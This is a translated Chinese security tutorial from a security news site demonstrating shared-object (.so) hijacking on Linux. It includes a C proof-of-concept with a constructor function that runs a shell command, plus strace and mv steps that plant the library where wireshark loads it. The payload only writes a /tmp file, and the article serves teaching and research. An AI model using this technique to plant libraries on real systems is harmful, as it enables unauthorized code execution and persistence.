# *nix系统上的共享对象(.so)注入

阅读量 **116508**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-10-16 09:45:03

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

[介绍]

在WINDOWS平台上有"DLL Injection","DLL Hijacking"等技术,我尝试同样的技术在*nix系统上,“共享对象(so)注入“

我测试的系统为kali 1.1.0 32 bit

查看Linux OS系统信息

    
    
    root@kali:~# lsb_release -a
    No LSB modules are available.
    Distributor ID: Kali
    Description:    Kali GNU/Linux 1.1.0
    Release:  1.1.0
    Codename:     moto

查看操作系统位数

    
    
    root@kali:~# getconf LONG_BIT
    32
    [PoC Code]
    #include <stdio.h>
    #include <stdlib.h>
    static void nix_so_injection_poc() __attribute__((constructor));
    void nix_so_injection_poc() {
             printf("PoC for DLL/so Hijacking in Linux n");
             system("touch /tmp/360bobao.txt && echo "so injection PoC" >/tmp/360bobao.txt");
    }

[明白POC代码以及构造.so文件]

    
    
    "__attribute__((constructor))" 是GCC的属性,通常会在程序开始共享库载入的时候执行,SO文件的.ctor段将标记构造函数。
    从C代码编译SO的命令如下:
    root@kali:~# gcc -shared -o libsoinjection.so -fPIC linux_so_loading.c
    root@kali:~# ls -la libsoinjection.so
    -rwxr-xr-x 1 root root 4859 Oct 15 16:50 libsoinjection.so

[手工演示注入利用]

我这里演示在wireshark中注入libsoinjection.so,首先需要查看哪个so文件尝试被wireshark载入,但是又没有在默认路径中搜索到。可以使用strace来做这个工作。

    
    
    root@kali:~# strace wireshark &> wireshark_strace.log
    root@kali:~# cat wireshark_strace.log |grep "No such file or directory"
    access("/usr/lib/i386-linux-gnu/gtk-3.0/3.0.0/i686-pc-linux-gnu/modules/liboverlay-scrollbar.so", F_OK) = -1 ENOENT (No such file or directory)
    access("/usr/lib/i386-linux-gnu/gtk-3.0/3.0.0/i686-pc-linux-gnu/modules/liboverlay-scrollbar.la", F_OK) = -1 ENOENT (No such file or directory)
    access("/usr/lib/i386-linux-gnu/gtk-3.0/3.0.0/modules/liboverlay-scrollbar.so", F_OK) = -1 ENOENT (No such file or directory)
    access("/usr/lib/i386-linux-gnu/gtk-3.0/3.0.0/modules/liboverlay-scrollbar.la", F_OK) = -1 ENOENT (No such file or directory)
    access("/usr/lib/i386-linux-gnu/gtk-3.0/i686-pc-linux-gnu/modules/liboverlay-scrollbar.so", F_OK) = -1 ENOENT (No such file or directory)
    access("/usr/lib/i386-linux-gnu/gtk-3.0/i686-pc-linux-gnu/modules/liboverlay-scrollbar.la", F_OK) = -1 ENOENT (No such file or directory)
    access("/usr/lib/i386-linux-gnu/gtk-3.0/modules/liboverlay-scrollbar.so", F_OK) = 0
    stat64("/usr/lib/i386-linux-gnu/gtk-3.0/modules/liboverlay-scrollbar.so", {st_mode=S_IFREG|0644, st_size=75972, ...}) = 0
    open("/usr/lib/i386-linux-gnu/gtk-3.0/modules/liboverlay-scrollbar.so", O_RDONLY|O_CLOEXEC) = 3

我们要做的就是将libsoinjection.so重命名为上面wireshark在载入时没有找到的一个SO文件,并将它放在相应的目录,比如我这里的是liboverlay-scrollbar.so

    
    
    root@kali:~# mv libsoinjection.so liboverlay-scrollbar.so
    root@kali:~# mv liboverlay-scrollbar.so /usr/lib/i386-linux-gnu/gtk-3.0/3.0.0/modules/

现在让我们验证下注入前后的区别

    
    
    root@kali:~# ls -la /tmp/360bobao.txt
    ls: cannot access /tmp/360bobao.txt: No such file or directory
    root@kali:~#wireshark
    PoC for DLL/so Hijacking in Linux
    Gtk-Message: Failed to load module "overlay-scrollbar"
    DLL/.so Hijacking in Linux
    Gtk-Message: Failed to load module "canberra-gtk-module"

现在查看/tmp/360bobao.txt已经被新建了

    
    
    root@kali:~# cat /tmp/360bobao.txt
    "so injection PoC"

[参考文档]

[http://blog.disects.com/search?q=dll+loading](http://blog.disects.com/search?q=dll+loading)

[http://tldp.org/HOWTO/Program-Library-HOWTO/dl-libraries.html](http://tldp.org/HOWTO/Program-Library-HOWTO/dl-libraries.html)

[http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html)

[http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html](http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html)

这是最简单的SO文件劫持方法,原文章([https://www.exploit-db.com/papers/37606/](https://www.exploit-db.com/papers/37606/))说得比较粗略,如果想了解更多细节的读者,可以买本<<LINUX/UNIX系统编程手册>>来看看,下次我会讲讲LD_PRELOAD劫持方法。

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82727](/post/id/82727)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

